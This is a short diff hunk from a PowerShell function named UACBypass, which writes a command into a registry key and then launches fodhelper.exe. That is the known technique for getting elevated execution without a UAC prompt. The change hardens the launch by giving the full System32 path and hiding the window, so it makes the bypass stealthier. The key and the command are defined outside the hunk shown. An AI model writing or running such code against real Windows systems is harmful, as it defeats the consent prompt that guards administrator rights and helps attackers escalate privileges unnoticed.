@@ -11,5 +11,5 @@ function UACBypass {
 
     Set-ItemProperty -Path $REG_KEY -Name "" -Value $CMD -Force
 
-    Start-Process -FilePath "fodhelper.exe"
+    Start-Process -FilePath "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 }
